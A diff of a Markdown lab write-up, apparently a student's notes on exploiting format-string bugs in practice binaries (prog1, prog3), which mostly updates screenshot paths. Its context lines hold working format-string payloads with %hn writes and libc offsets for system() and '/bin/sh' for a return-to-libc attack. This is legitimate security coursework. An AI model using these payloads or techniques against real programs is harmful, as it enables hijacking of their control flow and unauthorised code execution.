@@ -1,14 +1,10 @@
-![image-20240604170008320](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240604170008320.png)
+![image-20240703182007041](img/image-20240703182007041.png)
 
 ```
 echo $(printf "\x16\xf0\xff\xbf@@@@\x14\xf0\xff\xbf")%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn > input
 ```
 
-```
-./prog1 < input | grep -a address
-```
-
-![image-20240604171039599](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240604171039599.png)
+![image-20240703182037452](img/image-20240703182037452.png)
 
 ```
 echo $(printf "\x16\xF0\xFF\xBF@@@@\x14\xF0\xFF\xBF")%.8x%.8x%.8x%.8x%.56961x%hn%.57410x%hn > input
@@ -16,9 +12,9 @@ echo $(printf "\x16\xF0\xFF\xBF@@@@\x14\xF0\xFF\xBF")%.8x%.8x%.8x%.8x%.56961x%hn
 ./prog1 < input | grep -a address
 ```
 
-![image-20240604171331456](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240604171331456.png)
+![image-20240703182049573](img/image-20240703182049573.png)
 
-![image-20240607185325200](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240607185325200.png)
+![image-20240703182056202](img/image-20240703182056202.png)
 
 The address of the input array: 0xbfbe8bc4
 The value of the frame pointer: 0xbfbe8ba8
@@ -28,13 +24,13 @@ The value of the return address(after): 0x080485b9
 
 **EBP的地址是0xbfbe8ba8
 
-![image-20240604174550459](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240604174550459.png)
+![image-20240703182101908](img/image-20240703182101908.png)
 
-![image-20240607185752348](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240607185752348.png)
+![image-20240703182107302](img/image-20240703182107302.png)
 
 **注意到system()函数偏移为0x0003ad80，字符串“/bin/sh”偏移为0x0015ba3f
 
-![image-20240607185922109](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240607185922109.png)
+![image-20240703182113023](img/image-20240703182113023.png)
 
 **我们有libc的加载基址      0xb7e0b000 
 
@@ -132,7 +128,7 @@ file.close()
 %08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
 ```
 
-![image-20240607195639516](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240607195639516.png)
+![image-20240703182121121](img/image-20240703182121121.png)
 
 
 
@@ -140,9 +136,9 @@ file.close()
 
 
 
-![image-20240607200438664](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240607200438664.png)
+![image-20240703182126417](img/image-20240703182126417.png)
 
-![image-20240607210217429](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240607210217429.png)
+![image-20240703182131298](img/image-20240703182131298.png)
 
 
 
@@ -167,4 +163,4 @@ objdump -d ./prog3|grep win
 echo $(printf "\x0e\xa0\x04\x08@@@@\x0c\xa0\x04\x08")%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%1920x%hn%32007x%hn> input
 ```
 
-![image-20240608152450141](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240608152450141.png)
+![image-20240703182137353](img/image-20240703182137353.png)
